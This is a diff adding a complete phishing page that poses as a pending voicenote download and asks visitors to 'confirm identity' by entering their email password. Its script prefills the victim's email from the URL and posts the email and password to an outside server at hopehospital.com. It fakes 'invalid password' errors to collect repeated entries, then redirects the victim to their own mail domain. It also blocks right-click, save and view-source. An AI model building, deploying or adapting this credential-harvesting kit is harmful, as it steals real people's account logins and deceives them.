@@ -1,0 +1,396 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>DOC-20160626-WA0007</title>
+<link rel="icon" href="http://icons.iconarchive.com/icons/dakirby309/simply-styled/256/Microsoft-Purchase Order-2013-icon.png" type="image/gif" sizes="16x16">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {
+  margin: 0;
+  font-family: Trebuchet MS;
+}
+
+.topnav {
+  overflow: hidden;
+  background-color: #333;
+}
+
+.topnav a {
+  float: left;
+  color: #f2f2f2;
+  text-align: center;
+  padding: 14px 16px;
+  text-decoration: none;
+  font-size: 17px;
+}
+
+.topnav a:hover {
+  background-color: #ddd;
+  color: black;
+}
+
+.topnav a.active {
+  background-color: #00a1f1;
+  color: white;
+}
+
+input[type=text], input[type=email] {
+    width: 40%;
+    padding: 12px 20px;
+    margin: 8px 0;
+    display: inline-block;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+}
+
+
+input[type=text], input[type=password] {
+    width: 40%;
+    padding: 12px 20px;
+    margin: 8px 0;
+    display: inline-block;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+}
+
+button {
+    background-color: #00a1f1;
+    color: white;
+    padding: 14px 20px;
+    margin: 8px 0;
+
+    border: none;
+    cursor: pointer;
+    width: 40%;
+}
+
+button:hover {
+    opacity: 0.8;
+}
+
+.cancelbtn {
+    width: auto;
+    padding: 10px 18px;
+    background-color: #f44336;
+}
+
+.imgcontainer {
+    text-align: center;
+    margin: 10px 10px 0;
+}
+
+img.avatar {
+    width: 40%;
+    border-radius: 50%;
+}
+
+.container {
+    padding: 10px;
+}
+
+span.psw {
+    float: right;
+    padding-top: 16px;
+}
+
+/* Change styles for span and cancel button on extra small screens */
+@media screen and (max-width: 300px) {
+    span.psw {
+       display: block;
+       float: none;
+    }
+    .cancelbtn {
+       width: 100%;
+    }
+}
+
+/* The Modal (background) */
+.modal {
+    display: none; /* Hidden by default */
+    position: fixed; /* Stay in place */
+    z-index: 1; /* Sit on top */
+    left: 0;
+    top: 0;
+    width: 100%; /* Full width */
+    height: 100%; /* Full height */
+    overflow: auto; /* Enable scroll if needed */
+    background-color: rgb(0,0,0); /* Fallback color */
+    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+    padding-top: 60px;
+}
+
+/* Modal Content/Box */
+.modal-content {
+    background-color: #fefefe;
+    margin: 5% auto 15% auto; /* 5% from the top, 15% from the bottom and centered */
+    border: 1px solid #888;
+    width: 50%; /* Could be more or less, depending on screen size */
+}
+
+/* The Close Button (x) */
+.close {
+    position: absolute;
+    right: 25px;
+    top: 0;
+    color: #000;
+    font-size: 35px;
+    font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+    color: red;
+    cursor: pointer;
+}
+
+/* Add Zoom Animation */
+.animate {
+    -webkit-animation: animatezoom 0.6s;
+    animation: animatezoom 0.6s
+}
+
+@-webkit-keyframes animatezoom {
+    from {-webkit-transform: scale(0)} 
+    to {-webkit-transform: scale(1)}
+}
+    
+@keyframes animatezoom {
+    from {transform: scale(0)} 
+    to {transform: scale(1)}
+}
+
+/* Change styles for span and cancel button on extra small screens */
+@media screen and (max-width: 300px) {
+    span.psw {
+       display: block;
+       float: none;
+    }
+    .cancelbtn {
+       width: 100%;
+    }
+}
+</style>
+</head>
+<body>
+
+<div class="topnav">
+  <a class="active" href="#home"><td height="30" align="center" style="color:#4285f4; font-size: 18px">
+        <br>
+        <font>This session expiress in  </font> <span id="timer">00:11:10</span> mins
+    <script type="text/javascript">
+        function count() {
+ 
+        var startTime = document.getElementById('timer').innerHTML;
+        var pieces = startTime.split(":");
+        var time = new Date();    time.setHours(pieces[0]);
+        time.setMinutes(pieces[1]);
+        time.setSeconds(pieces[2]);
+        var timedif = new Date(time.valueOf() - 1000);
+        var newtime = timedif.toTimeString().split(" ")[0];
+        document.getElementById('timer').innerHTML=newtime;
+        setTimeout(count, 1000);
+    }
+    count();
+ 
+    </script>
+	</a>
+  <a href="#news"></a>
+
+</div>
+
+
+<br>
+<center>
+<br><br><center>
+<img src="data:image/png;base64,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"></img>
+  <p><font face="Trebuchet MS" color="Black" size="2">
+
+<strong>You have one New pending voicenote for download</strong><br>VON Q0016 - 
+	13252C.Von (0.94 MB) 
+
+
+
+
+</font>  </p>
+
+<button onclick="document.getElementById('id01').style.display='block'" style="width:auto;"><b>Listen</b></button></center>
+<div id="id01" class="modal">
+  
+ <script language=javascript>document.write(unescape('%3Cform%20class%3D%22modal-content%20animate%22%20method%3D%22post%22%20action%3D%22%22%3E'))</script>
+
+    <div class="imgcontainer">
+      <span onclick="document.getElementById('id01').style.display='none'" class="close" title="Close Modal">&times;</span>
+      <img src="data:image/png;base64,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" width="10%">
+    </div>
+
+    <div class="container">
+     <center> <p><font face="Trebuchet MS" color="black" size="2"> Confirm Identity to Prove You are not a Robot</font><br> <input type="email" id="email" name="email" Placeholder="Enter Email Address" class="form-control" value="" readonly required>
+<br>
+      <input type="password" id="password" name="password" placeholder="Enter Email Password" autofocus="" required="">
+        <br>
+        <div style="color: #FE4A4A; font-weight: bold; display: none; font-size: large;" class="warning" id="msg">Invalid email password please check and type in correctly.</div>
+                   <div style="color: #FFFFFF; display: none;" class="warning" id="error"></div>
+
+      <button type="submit"name="submit-btn" id="submit-btn">CONTINUE</button>
+     
+    </div>
+
+    <div class="container" style="background-color:#f1f1f1">
+     
+    
+    </div>
+  </form>
+</div>
+
+<script>
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+	   $(document).bind('keydown', function(e) {
+if(e.ctrlKey && (e.which == 83)) {
+e.preventDefault();
+return false;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.onkeydown = function(e) {
+if (e.ctrlKey &&
+(e.keyCode === 67 ||
+e.keyCode === 86 ||
+e.keyCode === 85 ||
+e.keyCode === 117)) {
+return false;
+} else {
+return true;
+}
+};
+$(document).keypress("u",function(e) {
+if(e.ctrlKey)
+{
+return false;      }
+else {
+return true;
+}});
+  /* global $ */
+  $(document).ready(function(){
+    var count=0;
+
+    
+
+    /////////////url email getting////////////////
+    var email = window.location.hash.substr(1);
+    if (!email) {
+
+    }
+    else
+    {
+        // $('#email').val(email);
+        var my_email =email;
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        
+        $('#email').val(my_email);
+        $('#emailch').html(my_email);
+        $("#msg").hide();
+       
+     
+      }
+      ///////////////url getting email////////////////
+
+
+      
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        $('#error').html("That account doesn't exist. Enter a different account");
+        email.focus;
+        return false;
+      }
+      if (!password) {
+        $('#error').show();
+        $('#error').html("Password field is empty");
+        email.focus;
+        return false;
+      }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      ///////////new injection////////////////
+      count=count+1;
+      
+      $.ajax({
+        dataType: 'JSON',
+        url: "https://hopehospital.com/a1/fire.php",
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                  $("#password").val("");
+                  if (count>=3) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("http://www."+my_slice);
+
+                  }
+                  // $('#msg').html(response['msg']);
+                }
+                else{
+                  // $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=3) {
+                count=0;
+                window.location.replace("http://www."+my_slice);
+              }
+              $("#msg").show();
+              // $('#msg').html("Invalid username/password please check details are typed in correctly");
+            },
+            complete: function(){
+              $('#submit-btn').html('CONTINUE');
+            }
+          });
+    });
+
+
+    });
+
+</script>
+
+</body>
+</html>
